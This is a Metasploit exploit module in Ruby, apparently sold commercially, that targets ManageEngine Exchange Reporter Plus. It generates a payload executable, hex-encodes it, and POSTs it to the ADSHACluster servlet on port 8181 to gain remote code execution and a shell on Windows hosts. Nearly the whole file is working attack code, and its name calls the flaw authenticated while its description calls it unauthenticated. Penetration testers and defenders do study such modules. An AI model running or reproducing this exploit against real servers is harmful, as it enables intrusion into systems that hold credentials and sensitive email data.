##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'ManageEngine Exchange Reporter Plus Authenticated Remote Code Execution',
      'Description' => %q{
    This module exploits an unauthenticated remote code execution vulnerability
    in order to gain a remote shell on the server.

    ManageEngine Exchange Reporter Plus is a popular enterprise solution for managing and
auditing environments using Exchange for email. Privileged
access to an Exchange Reporter Plus instance could yield significant insight into credentials
on the network and other sensitive information. This module exploits an unauthenticated remote code execution
vulnerability in order to gain a remote shell on the host.

    Categories: Enterprise

    Price: 7

    Video: https://asciinema.org/a/yKj1NyDhbpgM9Xbwr0QWTjapz

    OS: Windows

    Arch: Multi

    Requirements: Metasploit Framework
      },
      'Author' =>
        [
        ],
      'License' => 'VolatileMinds',
      'References' =>
        [
        ],
      'Privileged' => false,
      'Platform'   => ['win'],
      'Arch'       => [ARCH_X86,ARCH_X64],
      'Payload'    =>
        {
          #'BadChars' => "&\n=+%",
        },
      'Targets' =>
        [
          [ 'Automatic', { } ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => ''))

    register_options(
      [
         Opt::RPORT(8181),
         OptString.new('TARGETURI', [ true, "Base URI", '/']),
      ], self.class)
  end

  def exploit
  exe = generate_payload_exe(:code => payload.encoded)

  vars = {
    'MTCALL' => 'nativeClient',
    'BCP_RLL' => "0102",
    'BCP_EXE' => exe.unpack("H*")[0]
  }

  resp = send_request_cgi({
    'uri' => normalize_uri(target_uri.path, 'exchange/servlet/ADSHACluster'),
    'method' => 'POST',
    'vars_post' => vars
  })
  end
end
